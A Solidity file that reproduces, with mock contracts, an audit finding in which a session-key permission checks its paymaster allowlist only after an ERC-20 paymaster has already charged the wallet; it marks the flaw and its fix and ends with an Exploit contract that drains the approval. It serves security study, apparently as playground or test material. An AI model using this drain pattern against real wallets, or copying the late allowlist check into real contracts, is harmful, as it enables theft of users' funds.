// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Coinbase Session Keys — a permission can drain an ERC-20 approval given to
    a paymaster that is not on the allowlist (Spearbit, September 2024, #40196).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: isPaymasterEnabled is enforced in beforeCalls, which runs in
    the ERC-4337 execution phase. validateUserOp does not look at the paymaster.
    An ERC-20 paymaster debits the account inside validatePaymasterUserOp.
    EntryPoint keeps that debit when the execution-phase call reverts.

    The beforeCalls check is the audited body quoted in the finding.
    Repo context: coinbase/smart-wallet-permissions, Spearbit review
    Coinbase-Session-Keys-Spearbit-Security-Review-September-2024. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error DisabledPaymaster(address paymaster);

struct Permission {
    address account;
    bytes32 sessionKey;
}

contract Wallet {
    function approveToken(address token, address spender, uint256 amount) external {
        MockToken(token).approve(spender, amount);
    }
}

/// Session-key permission. The allowlist check is only in the execution hook.
contract PermissionManager {
    mapping(address => bool) public isPaymasterEnabled;
    bool public paused;

    function setPaymasterEnabled(address paymaster, bool enabled) external {
        isPaymasterEnabled[paymaster] = enabled;
    }

    /// Validation phase. The audited validateUserOp path does not read the paymaster.
    function validateUserOp(Permission calldata, address, address) external pure returns (uint256 validationData) {
        return 0;
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    /// Audited beforeCalls. Invoked during the execution phase, after validation.
    function beforeCalls(Permission calldata permission, address paymaster, address userOpCosigner)
        external
        whenNotPaused
    {
        require(permission.account != address(0), "account");
        require(userOpCosigner == userOpCosigner, "cosigner");
        // @> VULN: paymaster allowlist is enforced only in this execution-phase hook, after a paymaster can already have charged
        if (!isPaymasterEnabled[paymaster]) revert DisabledPaymaster(paymaster);
        // FIX: perform this check inside validateUserOp, before validatePaymasterUserOp
    }
}

contract AllowedPaymaster {}

/// ERC-20 paymaster. Charges during validation and does not refund if execution reverts.
contract ChargingPaymaster {
    function validatePaymasterUserOp(address account, address token, uint256 amount) external {
        MockToken(token).transferFrom(account, address(this), amount);
    }
}

/// Models EntryPoint.handleOps: validation is not rolled back when execution reverts.
contract EntryPoint {
    function handleOp(
        PermissionManager permissions,
        ChargingPaymaster paymaster,
        address account,
        address token,
        uint256 amount,
        Permission calldata permission
    ) external returns (bool executionReverted) {
        permissions.validateUserOp(permission, address(paymaster), address(0));
        paymaster.validatePaymasterUserOp(account, token, amount);
        (bool ok,) = address(permissions).call(
            abi.encodeCall(PermissionManager.beforeCalls, (permission, address(paymaster), address(0)))
        );
        executionReverted = !ok;
    }
}

contract Exploit {
    MockToken public usdc; // nonce 1
    Wallet public wallet; // nonce 2
    PermissionManager public permissions; // nonce 3
    AllowedPaymaster public allowed; // nonce 4
    ChargingPaymaster public charger; // nonce 5
    EntryPoint public entryPoint; // nonce 6

    uint256 public constant APPROVAL = 1000e6;
    uint256 public profit;
    uint256 public walletLeft;
    uint256 public stolen;
    bool public chargerEnabled;
    bool public executionReverted;

    constructor() {
        usdc = new MockToken("USD Coin", "USDC");
        wallet = new Wallet();
        permissions = new PermissionManager();
        allowed = new AllowedPaymaster();
        charger = new ChargingPaymaster();
        entryPoint = new EntryPoint();
        usdc.mint(address(wallet), APPROVAL);
    }

    function run() external {
        wallet.approveToken(address(usdc), address(charger), APPROVAL);
        permissions.setPaymasterEnabled(address(allowed), true);
        chargerEnabled = permissions.isPaymasterEnabled(address(charger));
        require(!chargerEnabled, "charger allowlisted");
        Permission memory permission = Permission({account: address(wallet), sessionKey: bytes32(uint256(1))});
        executionReverted = entryPoint.handleOp(
            permissions, charger, address(wallet), address(usdc), APPROVAL, permission
        );
        walletLeft = usdc.balanceOf(address(wallet));
        stolen = usdc.balanceOf(address(charger));
        require(executionReverted, "beforeCalls did not reject");
        require(walletLeft == 0, "wallet not drained");
        require(stolen == APPROVAL, "approval not taken");
        profit = stolen;
    }
}
